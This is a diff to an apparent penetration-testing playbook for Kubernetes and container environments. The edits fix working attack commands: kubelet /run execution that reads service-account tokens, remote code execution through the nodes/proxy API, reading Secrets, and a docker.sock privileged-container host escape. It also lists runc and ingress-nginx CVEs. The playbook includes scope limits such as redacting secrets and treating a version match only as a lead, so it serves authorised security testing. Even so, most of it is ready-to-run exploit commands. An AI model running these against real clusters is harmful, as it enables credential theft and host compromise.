@@ -73,13 +73,19 @@ curl -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
   -H 'Content-Type: application/json' \
   -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'
 
-# 3. Targeted access check for the crown-jewel verbs
-for R in secrets pods nodes/proxy pods/exec; do
+# 3. Targeted access check. `create` on resource "secrets" is the wrong question —
+#    list/get is the read; exec and proxy are subresources.
+ssar() { # verb resource [subresource]
+  local sub="${3:-}" extra=""
+  [ -n "$sub" ] && extra=",\"subresource\":\"$sub\""
   curl -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -X POST \
    -H 'Content-Type: application/json' \
-   -d "{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{\"verb\":\"create\",\"resource\":\"${R%%/*}\",\"subresource\":\"${R#*/}\"}}}" \
-   | grep -o '"allowed":[a-z]*' | sed "s#^#$R #"
-done
+   -d "{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{\"verb\":\"$1\",\"resource\":\"$2\"$extra}}}" \
+   | grep -o '"allowed":[a-z]*' | sed "s#^#$1 $2/$sub #"
+}
+ssar list secrets; ssar get secrets
+ssar create pods exec; ssar get pods log
+ssar get nodes proxy; ssar create nodes proxy
 
 # 4. Only if access review says allowed — read a real Secret to prove impact
 curl -sk "$SRV/api/v1/secrets" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("items",[])),"secrets")'
@@ -105,9 +111,11 @@ curl -sk "$SRV/pods" | python3 -m json.tool 2>/dev/null \
 NS=default; POD=target-pod; CTR=app
 
 # --- PRIMITIVE A: /run — returns command output DIRECTLY (no stream handling) ---
-# This is the simple correct primitive. Use this first.
-curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=id"
-curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+# Current kubelet reads cmd with QueryParameter, NOT the POST body. -d "cmd=id"
+# is a false negative on modern nodes. The query form also works on old kubelets.
+# The handler splits cmd on spaces after URL-decoding. One id, then one token read.
+curl -sk -X POST "$SRV/run/$NS/$POD/$CTR?cmd=id"
+curl -sk -X POST "$SRV/run/$NS/$POD/$CTR?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token"
 
 # --- PRIMITIVE B: /exec — SPDY/WebSocket stream, NOT a plain POST ---
 # Option 1: kubeletctl handles the stream transport for you (recommended)
@@ -135,12 +143,12 @@ curl -s "http://$TARGET:10255/metrics" | head
 When 10250 is firewalled but you hold a token (even a low-priv pod SA) with `nodes/proxy`, route exec **through the API server**:
 
 ```bash
-SRV="https://$TARGET:6443"; H="-H \"Authorization: Bearer $TOKEN\""
+SRV="https://$TARGET:6443"
 NODE=$(curl -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes" | grep -o '"name":"[^"]*"' | head -1 | cut -d'"' -f4)
 
-# /run via the node proxy → output comes straight back
+# /run via the node proxy. Same query-string cmd as the kubelet (body is ignored).
 curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
-  "$SRV/api/v1/nodes/$NODE/proxy/run/$NS/$POD/$CTR" -d "cmd=id"
+  "$SRV/api/v1/nodes/$NODE/proxy/run/$NS/$POD/$CTR?cmd=id"
 
 # enumerate every pod on a node via the proxy
 curl -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes/$NODE/proxy/pods"
@@ -205,20 +213,22 @@ curl -sk -X PATCH "$API/api/v1/namespaces/$NS/pods/$POD/ephemeralcontainers" \
 
 ```bash
 # docker.sock reachable (SSRF unix://, LFI of socket, or RCE on host)
-curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/info
-curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json
+# Unversioned /version is the fingerprint. If a later call 404s, prefix /v<ApiVersion>.
+curl -s --unix-socket /var/run/docker.sock http://localhost/version
+curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
 
 # Privileged container bind-mounting host root → read/write host fs (host escape)
 curl -s --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
-  -X POST http://localhost/v1.41/containers/create?name=poc \
+  -X POST http://localhost/containers/create?name=poc \
   -d '{"Image":"alpine","Cmd":["cat","/host/etc/hostname"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
-curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/poc/start
-curl -s --unix-socket /var/run/docker.sock "http://localhost/v1.41/containers/poc/logs?stdout=1"
+curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/poc/start
+curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/poc/logs?stdout=1"
 # Impact proof = the NODE's /etc/hostname (differs from the container's hostname).
 ```
 
 **Container-escape CVEs (gate on runc/version):**
 - **CVE-2024-21626 — "Leaky Vessels" (runc ≤ 1.1.11):** a leaked host file descriptor via `/proc/self/fd/<n>` lets a malicious image (`WORKDIR /proc/self/fd/N`) or `runc exec` cwd escape to the host filesystem → host RCE. Test only with an image you control on a build/registry surface where you can influence the Dockerfile.
+- **CVE-2025-31133 / CVE-2025-52565 / CVE-2025-52881 (runc < 1.2.8 and < 1.3.3; 1.1.x was not patched):** masked-path and `/dev/console` symlink races, plus a procfs write redirect. A version match is a **lead**. Do not run a mount race against a production runtime. Claim a breakout only when you can quote a host file the container should not see.
 - **CVE-2019-5736 (runc):** overwrite the host `/proc/self/exe` (the runc binary) from inside a container you can exec into → host root on next runc invocation. Applies to very old runc.
 - **CVE-2022-0492 (cgroups v1 `release_agent`):** a container with `CAP_SYS_ADMIN` (or able to mount cgroupfs) writes a `release_agent` that executes on the host → escape. Check container caps first.
 
@@ -250,7 +260,7 @@ curl -sk "$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurati
 
 - **`containerd.sock` / `crio.sock`** — same class as `docker.sock` (`/run/containerd/containerd.sock`). `crictl` or the containerd API that lists pods and starts a privileged container. Proof is a host file the container cannot already see. One container, remove it, stop.
 - **RBAC verbs `escalate`, `bind`, `impersonate`** — SelfSubjectAccessReview for those verbs. `impersonate` on `users`/`serviceaccounts` plus one request with `Impersonate-User` that reads a Secret is the finding. Do not bind `cluster-admin`.
-- **ingress-nginx admission (IngressNightmare, CVE-2025-1974 and CVE-2025-1097 / -1098 / -24513 / -24514).** Affected controller versions: `<1.11.5` and `1.12.0` (fixed `1.11.5` and `1.12.1`). The validating webhook is often unauthenticated on the pod network and, on some installs, on a public Service. Fingerprint the image tag or the controller version and whether the webhook answers an `AdmissionReview` without credentials. A version match plus reachability is a **lead**. RCE is claimed only with command output from the controller, and you do not upload a shared library, leave a pod, or persist a binary. If you cannot show execution safely, report the exposed unauthenticated webhook and the vulnerable version as the proven facts and stop.
+- **ingress-nginx admission (IngressNightmare, CVE-2025-1974 and CVE-2025-1097 / -1098 / -24513 / -24514).** Affected controller versions: `<1.11.5` and `1.12.0` (fixed `1.11.5` and `1.12.1`). The validating webhook is often unauthenticated on the pod network and, on some installs, on a public Service. Fingerprint the image tag or the controller version and whether the webhook answers an `AdmissionReview` without credentials. A version match plus reachability is a **lead**. RCE is claimed only with command output from the controller, and you do not upload a shared library, leave a pod, or persist a binary. If you cannot show execution safely, report the exposed unauthenticated webhook and the vulnerable version as the proven facts and stop. **CVE-2024-7646** is the older annotation-validation bypass (`<1.10.4` and `<1.11.2`) and needs `create` on Ingress; same rule — version is a lead, a controller Secret you actually read is the proof, delete the test Ingress.
 - **Cloud metadata from a pod** you already exec: EKS/GKE/AKS paths in Phase 1. GKE legacy `kube-env` attribute is a secret if it returns. One token, then Phase 6.
 
 ## Chain Table
@@ -284,7 +294,7 @@ curl -sk "$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurati
 ## Validation Checklist
 
 - [ ] **API anon:** SelfSubjectRulesReview shows privileged verbs AND a real Secret value was read (redacted).
-- [ ] **Kubelet:** literal `id`/`hostname` output returned from 10250 `/run`, or a completed `/exec` stream — not a bare 302.
+- [ ] **Kubelet:** literal `id`/`hostname` output returned from 10250 `/run?...&cmd=`, or a completed `/exec` stream — not a bare 302, and not a body-only POST that never set the query param.
 - [ ] **nodes/proxy RCE:** command output returned through `/api/v1/nodes/<node>/proxy/run/...` with your token.
 - [ ] **etcd:** decoded Secret bytes shown (proves unencrypted + readable), not just a key listing.
 - [ ] **docker.sock / escape:** the NODE's host file content retrieved (distinct from container), or runc-escape PoC output.
